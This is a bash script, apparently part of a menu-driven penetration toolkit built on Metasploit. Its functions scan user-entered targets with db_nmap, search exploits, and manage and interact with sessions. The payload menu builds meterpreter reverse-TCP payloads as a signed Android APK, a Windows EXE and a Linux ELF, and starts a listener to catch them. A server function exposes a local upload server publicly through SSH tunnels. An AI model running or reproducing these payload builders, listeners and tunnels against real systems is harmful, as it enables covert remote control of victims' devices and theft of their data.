#!/bin/bash



# ══════════════════════════════════════════════════════════════════════════════
# 		META Logic
# ══════════════════════════════════════════════════════════════════════════════


start () {
    local MSF_SESSION="msf"

    info "Starting Metasploit Database..."
    log_event "METASPLOIT" "Starting Metasploit database"

    if ! systemctl is-active --quiet postgresql; then
        warn "PostgreSQL not running — starting..."
        log_event "METASPLOIT" "PostgreSQL not running - starting"
        sudo systemctl start postgresql
        sleep 1
    fi

    if systemctl is-active --quiet postgresql; then
        info "PostgreSQL running"
        log_event "METASPLOIT" "PostgreSQL running"
    else
        err "Failed to start PostgreSQL"
        log_event "ERROR" "Failed to start PostgreSQL"
        enter
        return 1
    fi

    info "Initializing msfdb..."
    log_event "METASPLOIT" "Initializing msfdb"
    sudo msfdb init 2>/dev/null

    if tmux has-session -t "$MSF_SESSION" 2>/dev/null; then
        info "Metasploit already running — connecting to existing session..."
        log_event "METASPLOIT" "Connecting to existing Metasploit session"
        sudo tmux attach-session -t "$MSF_SESSION"
    else
        info "Launching msfconsole..."
        log_event "METASPLOIT" "Launching new msfconsole session"
        sudo tmux new-session -s "$MSF_SESSION" "msfconsole -q"
    fi

    enter
}

scanning () {
    read -rp "$(info "Enter target IP/Subnet: ")" TARGET
    log_event "METASPLOIT" "Starting db_nmap scan on $TARGET"
    info "Running db_nmap on $TARGET..."
    sudo msfconsole -q -x "db_nmap -sV -T4 --open $TARGET; exit"
    log_event "METASPLOIT" "db_nmap scan completed on $TARGET"
    enter
}

list_sessions () {
    log_event "METASPLOIT" "Listing active sessions"
    sudo msfconsole -q -x "sessions -l; exit"
    enter
}

interact_session () {
    read -rp "$(info "Session ID: ")" SID
    log_event "METASPLOIT" "Interacting with session $SID"
    sudo msfconsole -q -x "sessions -i $SID"
    enter
}

kill_session () {
    read -rp "$(info "Session ID to kill: ")" SID
    log_event "METASPLOIT" "Killing session $SID"
    sudo msfconsole -q -x "sessions -k $SID; exit"
    enter
}

exploit () {
    read -rp "$(info "Enter service/CVE to search: ")" QUERY
    log_event "METASPLOIT" "Searching for exploit: $QUERY"
    sudo msfconsole -q -x "search $QUERY; exit"
    enter
}

sessions () {
    log_event "METASPLOIT" "Listing sessions"
    sudo msfconsole -q -x "sessions -l; exit"
    enter
}

exploition () {
    while true; do
        info "-----Make Choice-----"
        info "1) List Sessions"
        info "2) Session Interact"
        info "3) Kill Session"
        info "0) Back"
        info "00) Main Menu"

        read -rp "$(info ">>")" choice

        case $choice in
            1) list_sessions ;;
            2) interact_session ;;
            3) kill_session ;;
            0) break ;;
            00) log_event "METASPLOIT" "Returning to main menu"; break 2 ;;
            *) error
               continue ;;
        esac
    done
}

create_apk () {
read -rp "$(info "Your IP (LHOST): ")" LHOST
read -rp "$(info "Port (LPORT): ")" LPORT
read -rp "$(info "Output filename: ")" FNAME

log_event "PAYLOAD" "Creating Android APK payload (LHOST: $LHOST, LPORT: $LPORT, file: $FNAME)"

msfvenom -p android/meterpreter/reverse_tcp \
LHOST="$LHOST" LPORT="$LPORT" \
-o /tmp/"$FNAME".apk

info "Signing APK..."
rm -f /tmp/test.keystore 2>/dev/null

local ks_pass
ks_pass=$(openssl rand -base64 24)

keytool -genkey -v -keystore /tmp/test.keystore \
-alias testkey -keyalg RSA \
-keysize 2048 -validity 365 \
-dname "CN=Test, OU=Test, O=Test, L=Test, S=Test, C=US" \
-storepass "$ks_pass" -keypass "$ks_pass" 2>/dev/null

apksigner sign --ks /tmp/test.keystore \
--ks-pass pass:"$ks_pass" \
--key-pass pass:"$ks_pass" \
--out /tmp/"$FNAME"-signed.apk \
/tmp/"$FNAME".apk

info "Signed APK saved to /tmp/$FNAME-signed.apk"
log_event "PAYLOAD" "Android APK created successfully: /tmp/$FNAME-signed.apk"
enter
}

create_exe () {
    read -rp "$(info "Your IP (LHOST): ")" LHOST
    read -rp "$(info "Port (LPORT): ")" LPORT
    read -rp "$(info "Output filename: ")" FNAME
    log_event "PAYLOAD" "Creating Windows EXE payload (LHOST: $LHOST, LPORT: $LPORT, file: $FNAME)"
    msfvenom -p windows/meterpreter/reverse_tcp \
        LHOST="$LHOST" LPORT="$LPORT" \
        -f exe -o /tmp/"$FNAME".exe
    info "EXE saved to /tmp/$FNAME.exe"
    log_event "PAYLOAD" "Windows EXE created successfully: /tmp/$FNAME.exe"
    enter
}

create_elf () {
    read -rp "$(info "Your IP (LHOST): ")" LHOST
    read -rp "$(info "Port (LPORT): ")" LPORT
    read -rp "$(info "Output filename: ")" FNAME
    log_event "PAYLOAD" "Creating Linux ELF payload (LHOST: $LHOST, LPORT: $LPORT, file: $FNAME)"
    msfvenom -p linux/x86/meterpreter/reverse_tcp \
        LHOST="$LHOST" LPORT="$LPORT" \
        -f elf -o /tmp/"$FNAME".elf
    info "ELF saved to /tmp/$FNAME.elf"
    log_event "PAYLOAD" "Linux ELF created successfully: /tmp/$FNAME.elf"
    enter
}

listner () {
    read -rp "$(info "LHOST: ")" LHOST
    read -rp "$(info "LPORT: ")" LPORT
    log_event "METASPLOIT" "Starting listener (LHOST: $LHOST, LPORT: $LPORT)"
    sudo fuser -k "${LPORT}"/tcp 2>/dev/null

    sudo msfconsole -q -x "
        use exploit/multi/handler;
        set payload android/meterpreter/reverse_tcp;
        set LHOST $LHOST;
        set LPORT $LPORT;
        run"
    log_event "METASPLOIT" "Listener stopped"
}

payload () {
    while true; do
        info "-----Make Choice-----"
        info "1) Android APK"
        info "2) Windows EXE"
        info "3) Linux ELF"
        info "4) Start Listener"
        info "0) Back"
        info "00) Main Menu"

        read -rp "$(info ">>")" choice

        case $choice in
            1) create_apk ;;
            2) create_exe ;;
            3) create_elf ;;
            4) listner ;;
            0) break ;;
            00) log_event "METASPLOIT" "Returning to main menu"; break 2 ;;
            *) error
               continue ;;
        esac
    done
}

server () {
    local venv
venv="/home/$(logname)/.venv"

log_event "SERVER" "Starting upload server"

if [[ ! -x "$venv/bin/python3" ]]; then
info "Setting up environment..."
log_event "SERVER" "Setting up Python virtual environment"
python3 -m venv "$venv"
"$venv/bin/pip" install uploadserver -q || { 
    err "Failed to install uploadserver"
    log_event "ERROR" "Failed to install uploadserver"
    enter
    return 1
}
fi

read -rp "$(info "Full path to share (e.g. /tmp): ")" share

if [[ ! -d "$share" ]]; then
err "Folder not found"
log_event "ERROR" "Folder not found: $share"
enter
return 1
fi

cd "$share" || { 
    err "Could not cd to $share"
    log_event "ERROR" "Could not cd to $share"
    return 1
}

local old_pid
old_pid=$(sudo fuser 8080/tcp 2>/dev/null)
[[ -n "$old_pid" ]] && sudo kill "$old_pid" 2>/dev/null

info "Starting local server on port 8080..."
log_event "SERVER" "Starting local server on port 8080 sharing: $share"
"$venv/bin/python3" -m uploadserver 8080 &
server_pid=$!

info "Creating tunnel - YOUR URL WILL APPEAR BELOW:"
echo ""

local script pid
script="/tmp/term_$$_${RANDOM}.sh"
pid="/tmp/term_$$_${RANDOM}.pid"

cat > "$script" <<EOF
#!/bin/bash
{
    if ! timeout 30 ssh -T -o StrictHostKeyChecking=accept-new -o ConnectTimeout=10 -R 80:localhost:8080 localhost.run; then
        timeout 30 ssh -T -o StrictHostKeyChecking=accept-new -o ConnectTimeout=10 -R 80:localhost:8080 serveo.net
    fi
} &
echo \$! > "$pid"
wait
rm -f $pid
EOF

chmod +x "$script"
bash "$script" &
sleep 2

local readdata
readdata=$(cat "$pid" 2>/dev/null)
if [[ -z $readdata ]]; then
    err "Tunnel Failed to start"
    log_event "ERROR" "Tunnel failed to start"
    kill "$server_pid" 2>/dev/null
    rm -f "$script" "$pid"
    cd - > /dev/null
    return 1
fi

log_event "SERVER" "Tunnel started successfully"

trap 'info "Interuptted"; break' INT

while kill -0 "$readdata" 2>/dev/null; do
    sleep 1
done

trap '' INT

info "Tunnel closed"
log_event "SERVER" "Tunnel closed"

sudo pkill -P "$readdata" 2>/dev/null
sudo kill "$readdata" 2>/dev/null
kill "$server_pid" 2>/dev/null
rm -f "$script" "$pid"
cd - > /dev/null
}
# ══════════════════════════════════════════════════════════════════════════════
# META MENU Logic
# ══════════════════════════════════════════════════════════════════════════════

meta_menu () {
    clear
    while true; do
		status_banner
		print_meta
		echo -e ""
        info "-----Make Choice-----"
        info "1) Start/Connect Database"
        info "2) Open a Server"
        info "3) Network Scan"
        info "4) Search Exploit"
        info "5) Active Sessions"
        info "6) Post Exploitation"
        info "7) Create Payloads"
        info "0) Back"

        read -rp "$(info ">>")" choice

        case $choice in
            1) start ;;
            2) server ;;
            3) scanning ;;
            4) exploit ;;
            5) sessions ;;
            6) exploition
               [[ $GOTO_MAIN -eq 1 ]] && { GOTO_MAIN=0; break; } ;;
            7) payload
               [[ $GOTO_MAIN -eq 1 ]] && { GOTO_MAIN=0; break; } ;;
            0) break ;;
            *) error
               continue ;;
        esac
    done
}
